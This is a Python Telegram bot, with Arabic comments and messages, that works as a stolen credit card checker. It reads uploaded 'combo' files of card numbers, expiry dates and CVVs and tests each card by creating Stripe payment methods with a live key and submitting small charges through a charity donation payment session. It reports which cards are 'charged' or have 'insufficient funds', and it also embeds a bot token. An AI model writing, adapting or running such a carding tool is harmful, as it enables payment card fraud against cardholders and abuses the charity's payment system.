import os, sys
import random
import telebot
from telebot import types
import time
import requests
import json

token = "5888527479:AAGiVLEco8Au9z0o01I73nCMTNDK7fy4k1k"
IDOWNER = 1088443477

a = True
bot = telebot.TeleBot(token)

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id == IDOWNER:
        idd = message.from_user.id
        first = message.from_user.first_name
        last = message.from_user.last_name
        if "None" in str(last):
            last = ""
        url = f"tg://user?id={idd}"
        bot.reply_to(message,
                   f"""أهلا  [{first + last}]({url}) 
يرجي الملاحظة ان البوت يعمل معك أنت فقط .
أرسل الكومبو وهفحصهولك .
متشغلش دماغك وتبعت أكثر من كومبو وتقول مش شغال ليه 😂""",
                   parse_mode="markdown")

# دالة فحص البطاقة عبر البوابتين (Stripe ثم FundraiseUp)
def check_card(visaa):
    try:
        visa = visaa.split('|')
        if len(visa) < 4:
            return "Bad", "Invalid format"
        number = visa[0]
        if len(number) != 16:
            return "Bad", "Invalid length"
        month = visa[1]
        year = visa[2]
        if len(year) == 4:
            year = year[2:]
        cvv = visa[3]
        if len(cvv) != 3:
            return "Bad", "Invalid CVC"

        s = requests.session()

        # -------------------------------------------------------------
        # الخطوة 1: إنشاء payment_method في Stripe
        # -------------------------------------------------------------
        stripe_url = "https://api.stripe.com/v1/payment_methods"
        stripe_headers = {
            "authority": "api.stripe.com",
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
        }
        
        stripe_data = {
            "type": "card",
            "card[number]": number,
            "card[cvc]": cvv,
            "card[exp_month]": month,
            "card[exp_year]": f"20{year}" if len(year) == 2 else year,
            "key": "pk_live_9RzCojmneCvL31GhYTknluXp",
            "_stripe_account": "acct_1IkRAxH3ux3KMQYE",
            "_stripe_version": "2026-02-25.clover"
        }

        res_stripe = s.post(stripe_url, headers=stripe_headers, data=stripe_data, timeout=15)
        stripe_json = res_stripe.json()

        if "id" not in stripe_json:
            return "Bad", "Stripe Error / Declined"

        # -------------------------------------------------------------
        # الخطوة 2: إرسال الطلب النهائي إلى FundraiseUp
        # -------------------------------------------------------------
        fund_url = "https://api.fundraiseup.com/paymentSession/7565934161638650764/pay"
        fund_headers = {
            "authority": "api.fundraiseup.com",
            "accept": "*/*",
            "content-type": "text/plain; charset=utf-8",
            "origin": "https://www.who.foundation",
            "referer": "https://www.who.foundation/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
        }

        fund_payload = {
            "paymentMethod": stripe_json,
            "embedVersion": "260812-0836"
        }

        res_fund = s.post(fund_url, headers=fund_headers, data=json.dumps(fund_payload), timeout=15)
        response_text = res_fund.text

        # -------------------------------------------------------------
        # الخطوة 3: تحليل النتيجة
        # -------------------------------------------------------------
        if 'insufficient funds' in response_text.lower():
            return "Insufficient Funds", response_text
        elif 'successful' in response_text.lower() or 'charge' in response_text.lower() or '"status":"succeeded"' in response_text.lower():
            return "Charged", response_text
        else:
            return "Bad", response_text

    except Exception as e:
        return "Error", str(e)

@bot.message_handler(content_types=['document'])
def send_file(message):
    global a
    if message.from_user.id == IDOWNER:

        insufficient_funds = 0
        charge = 0
        Bad = 0
        try:
            file_info = bot.get_file(message.document.file_id)
            file_input = bot.download_file(file_info.file_path)
            file_name = message.document.file_name
            with open(file_name, 'wb') as f:
                f.write(file_input)
        except Exception as e:
            bot.reply_to(message, text='مشكلة من الملف .')
            return

        mas = types.InlineKeyboardMarkup(row_width=1)
        h7am0 = types.InlineKeyboardButton('Hamo • حـمــو', url='https://t.me/hamo_back')
        mas.add(h7am0)
        
        with open(file_name, "r", encoding="utf-8", errors="ignore") as file_lines:
            lines = file_lines.read().splitlines()
            
        alll = len(lines)
        lool = bot.reply_to(message, text=f' . تم اكتشاف عدد {alll} فيزا في الملف', reply_markup=mas)
        a = True
        
        for visaa in lines:
            if not a:
                break
            
            status, response_data = check_card(visaa)

            if status == "Insufficient Funds":
                insufficient_funds += 1
                print(f'\033[1;32m {visaa} \n Your card has insufficient funds.')
                print('\033[0m ++++++++++++++++++++++++++++++++')
                hamo = f"""｢𝙰𝚙𝚙𝚛𝚘𝚟𝚎𝚍 ⤈ Hamo - حـمــو |🇪🇬 」

◎ 𝚌𝚌 ➾ <code>{visaa}</code>
◎ 𝙶𝚊𝚝𝚎𝚠𝚊𝚢 ➾ 30 ₺ - 3.5 $
◎ 𝚛𝚎𝚜𝚞𝚕𝚝 ➾ insufficient funds.✅

ღ 𝙱𝚈 ➣ @hamo_back
"""
                bot.send_message(message.chat.id, f"{hamo}", parse_mode='html')
                time.sleep(random.randint(1, 3))
                
            elif status == "Charged":
                charge += 1
                print(f'\033[1;32m {visaa} \n payment-successful.')
                print('\033[0m ++++++++++++++++++++++++++++++++')
                hamo = f"""｢𝙰𝚙𝚙𝚛𝚘𝚟𝚎𝚍 ⤈ Hamo - حـمــو |🇪🇬 」

◎ 𝚌𝚌 ➾ <code>{visaa}</code>
◎ 𝙶𝚊𝚝𝚎𝚠𝚊𝚢 ➾ 30 ₺ - 3.5 $
◎ 𝚛𝚎𝚜𝚞𝚕𝚝 ➾ charge 30 ₺ .✅

ღ 𝙱𝚈 ➣ @hamo_back
"""
                with open("hamo.html", 'w', encoding='utf-8') as f:
                    f.write(str(response_data))
                bot.send_message(message.chat.id, f"{hamo}", parse_mode='html')
                time.sleep(random.randint(1, 3))
            else:
                Bad += 1
                print(f'\033[33m {visaa} \n   BAD ')
                print('\033[0m ++++++++++++++++++++++++++++++++')

            # تحديث الأزرار التفاعلية
            try:
                ms = types.InlineKeyboardMarkup(row_width=1)
                ALA = types.InlineKeyboardButton(f"- {visaa}", callback_data="ALA")
                B = types.InlineKeyboardButton(f"- insufficient funds : {insufficient_funds}", callback_data="Fsi1")
                e_btn = types.InlineKeyboardButton(f"- charge : {charge}", callback_data="Fsi1")
                z = types.InlineKeyboardButton(f"- Bad : {Bad}", callback_data="Fakz1")
                h7am0 = types.InlineKeyboardButton('Hamo • حـمــو', url='https://t.me/hamo_back')
                ms.add(ALA, B, e_btn, z, h7am0)
                bot.edit_message_text(chat_id=message.chat.id, message_id=lool.message_id, text="جاري الفحص ☠️ \n /stop لإيقاف الفحص", reply_markup=ms)
            except:
                pass

@bot.message_handler(commands=['stop'])
def stop_checker(message):
    global a  
    if message.from_user.id == IDOWNER:
        a = False  
        idd = message.from_user.id
        first = message.from_user.first_name
        last = message.from_user.last_name
        if "None" in str(last):
            last = ""
        url = f"tg://user?id={idd}"
        bot.reply_to(message,
                   f"""أهلا  [{first + last}]({url}) 
تم إيقاف الفحص ❤️""",
                   parse_mode="markdown")

print("""
   bot run ...
   enjoy""")

try:
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
except Exception as e:
    sys.stdout.flush()
    os.execv(sys.argv[0], sys.argv)
